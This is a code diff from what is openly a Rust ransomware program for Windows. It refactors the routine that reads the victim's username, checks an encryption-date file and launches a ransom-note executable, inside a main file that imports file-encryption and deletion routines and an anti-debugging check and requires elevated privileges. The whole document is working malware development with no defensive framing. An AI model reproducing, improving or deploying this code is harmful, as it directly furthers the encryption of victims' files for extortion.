@@ -6,9 +6,10 @@ mod antivm;
 mod traversing;
 
 use antivm::is_debugger_present;
+use winapi::shared::ntdef::LPSTR;
 use std::ffi::CString;
-use std::ptr::null_mut;
-use std::process;
+use std::ptr::{self, null_mut};
+use std::{mem, process};
 use traversing::{traverse_and_delete, traverse_and_encrypt};
 use winapi::shared::minwindef::HKEY;
 use winapi::um::fileapi::{CreateFileA, ReadFile, OPEN_EXISTING};
@@ -19,7 +20,7 @@ use winapi::um::processthreadsapi::{
 };
 use winapi::um::securitybaseapi::GetTokenInformation;
 use winapi::um::shellapi::ShellExecuteA;
-use winapi::um::winbase::{GetUserNameA, STARTF_USESHOWWINDOW};
+use winapi::um::winbase::{GetUserNameA, CREATE_DEFAULT_ERROR_MODE, CREATE_NEW_CONSOLE, STARTF_USESHOWWINDOW};
 use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
 use winapi::um::winnt::{FILE_ATTRIBUTE_NORMAL, FILE_READ_DATA, FILE_SHARE_READ};
 use winapi::um::winnt::{HANDLE, KEY_ALL_ACCESS, REG_SZ};
@@ -30,7 +31,6 @@ use winapi::um::winreg::{
 fn main() {
     // Uncomment this line to use anti-reversing
     // anti_reversing();
-
     if !is_already_encrypted() {
         if !check_elevation() {
             process::exit(0);
@@ -192,104 +192,93 @@ fn is_already_encrypted() -> bool {
 
 fn display_ransom_note() -> bool {
     let mut size: u32 = 0;
-    let mut buffer: Vec<i8> = Vec::new();
-    let mut user_name: Vec<u8> = Vec::new();
     unsafe {
         GetUserNameA(null_mut(), &mut size);
-        buffer.resize(size as usize, 0i8);
+    }
+    let mut buffer: Vec<u8> = vec![0; size as usize];
+    unsafe {
+        GetUserNameA(buffer.as_mut_ptr() as *mut i8, &mut size);
+    }
 
-        GetUserNameA(buffer.as_mut_ptr(), &mut size);
-        user_name = std::mem::transmute(buffer);
-        user_name.resize((size - 1) as usize, 0u8);
+    let username = String::from_utf8_lossy(&buffer[..(size - 1) as usize]);
 
-        let mut full_path = String::from("C:\\Users\\");
-        full_path.push_str(std::str::from_utf8(&user_name[..]).unwrap());
-        full_path.push_str("\\encrypt_date.txt");
+    let encrypt_date_path = format!("C:\\Users\\{}\\encrypt_date.txt", username);
 
-        let date_file: HANDLE = CreateFileA(
-            CString::new(full_path.clone()).unwrap().as_ptr(),
+    let date_file = unsafe {
+        let file_path_cstr = CString::new(encrypt_date_path.clone()).unwrap();
+        CreateFileA(
+            file_path_cstr.as_ptr(),
             FILE_READ_DATA,
             FILE_SHARE_READ,
-            null_mut(),
+            ptr::null_mut(),
             OPEN_EXISTING,
             FILE_ATTRIBUTE_NORMAL,
-            null_mut(),
-        );
+            ptr::null_mut(),
+        )
+    };
 
-        let mut get_date: Vec<u8> = vec![0; 2];
-        let mut count: u32 = 0;
+    if date_file == INVALID_HANDLE_VALUE {
+        println!("Error: Couldn't open encrypt_date.txt file.");
+        return false;
+    }
+
+    let mut get_date = [0u8; 2];
+    let mut count = 0;
+    unsafe {
         ReadFile(
             date_file,
             get_date.as_mut_ptr() as *mut _,
             2,
             &mut count,
-            null_mut(),
+            ptr::null_mut(),
         );
-
-        if get_date[0] == 99 && get_date[1] == 99 {
-            return false;
-        }
-
         CloseHandle(date_file);
-        let mut name: Vec<i8> = vec![0; 200];
-        let length = GetModuleFileNameA(null_mut(), name.as_mut_ptr(), 200);
-        let mut path: Vec<u8> = Vec::new();
-        for i in 0..(length - 19) as usize {
-            path.push(name[i] as u8);
-        }
+    }
+    if get_date == [99, 99] {
+        return false;
+    }
 
-        for byte in "ransomnote.exe".as_bytes() {
-            path.push(*byte);
-        }
-        let mut start_up_info: STARTUPINFOA = STARTUPINFOA {
-            cb: std::mem::size_of::<STARTUPINFOA>() as u32,
-            lpReserved: null_mut(),
-            lpDesktop: null_mut(),
-            lpTitle: null_mut(),
-            dwX: 100,
-            dwY: 100,
-            dwXSize: 500,
-            dwYSize: 500,
-            dwXCountChars: 0,
-            dwYCountChars: 0,
-            dwFillAttribute: 0,
-            dwFlags: 4 | STARTF_USESHOWWINDOW,
-            wShowWindow: 0,
-            cbReserved2: 0,
-            lpReserved2: null_mut(),
-            hStdInput: null_mut(),
-            hStdOutput: null_mut(),
-            hStdError: null_mut(),
-        };
-        let mut process_handle: HANDLE = null_mut();
-        let mut thread_handle: HANDLE = null_mut();
-        let mut process_info: PROCESS_INFORMATION = PROCESS_INFORMATION {
-            hProcess: process_handle,
-            hThread: thread_handle,
-            dwProcessId: 4000,
-            dwThreadId: 5000,
-        };
-        let mut command_line: Vec<u8> = Vec::new();
-        for byte in &path {
-            command_line.push(*byte);
-        }
-        command_line.push(32u8);
-        for byte in full_path.as_bytes() {
-            command_line.push(*byte);
-        }
-        command_line.push(0u8);
-        CreateProcessA(
-            CString::from_vec_unchecked(path).as_ptr(),
-            CString::from_vec_unchecked(command_line).as_ptr() as *mut i8,
-            null_mut(),
-            null_mut(),
+    let current_exe_path = std::env::current_exe().unwrap_or_else(|_| {
+        println!("Error: Couldn't retrieve current executable's path.");
+        std::process::exit(1);
+    });
+    let ransomnote_exe_path = current_exe_path
+        .parent()
+        .map(|p| p.join("ransomnote.exe"))
+        .unwrap_or_else(|| {
+            println!("Error: Couldn't construct ransomnote.exe path.");
+            std::process::exit(1);
+        });
+
+    if !ransomnote_exe_path.exists() {
+        println!("Error: ransomnote.exe does not exist.");
+        return false;
+    }
+
+    let mut start_up_info: winapi::um::processthreadsapi::STARTUPINFOA = unsafe { mem::zeroed() };
+    start_up_info.cb = mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOA>() as u32;
+    let mut process_info: winapi::um::processthreadsapi::PROCESS_INFORMATION = unsafe { mem::zeroed() };
+
+    let command_line = CString::new(format!("\"{}\" \"{}\"", ransomnote_exe_path.to_string_lossy(), encrypt_date_path)).unwrap();
+
+    let success = unsafe {
+        winapi::um::processthreadsapi::CreateProcessA(
+            ptr::null(),
+            command_line.as_ptr() as *mut i8,
+            ptr::null_mut(),
+            ptr::null_mut(),
             0,
-            0x10, //CREATE_NEW_CONSOLE
-            null_mut(),
-            null_mut(),
+            winapi::um::winbase::CREATE_NEW_CONSOLE,
+            ptr::null_mut(),
+            ptr::null_mut(),
             &mut start_up_info,
             &mut process_info,
-        );
-        return true;
+        )
+    };
+    
+    if success != 0 {
+        true
+    } else {
+        false
     }
 }
